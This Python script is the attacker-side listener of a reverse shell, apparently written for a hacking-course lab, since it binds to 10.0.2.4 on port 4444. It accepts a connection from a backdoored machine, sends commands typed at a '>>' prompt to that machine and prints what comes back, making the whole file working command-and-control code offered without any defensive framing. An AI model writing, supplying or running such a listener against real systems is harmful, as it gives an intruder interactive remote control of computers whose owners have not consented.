#!/usr/bin/env python

import socket
import json


class Listener:
    def __init__(self, host, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((host, port))
        self.listener.listen(0)
        print("Listening for incoming connections...")
        self.connection, self.address = self.listener.accept()
        print("Connection accepted from " + str(self.address))

    def reliable_send(self, data):
        json_data = json.dumps(data).encode()  # Convert JSON to bytes
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = b""  # Use bytes to collect data
        while True:
            try:
                json_data += self.connection.recv(1024)  # Concatenate bytes
                return json.loads(json_data.decode())  # Decode and parse JSON
            except ValueError:
                continue  # Keep receiving if JSON is incomplete

    def execute_remotely(self, command):
        self.reliable_send(command)  # Command is already a string, no encoding needed
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)


my_listener = Listener("10.0.2.4", 4444)
my_listener.run()
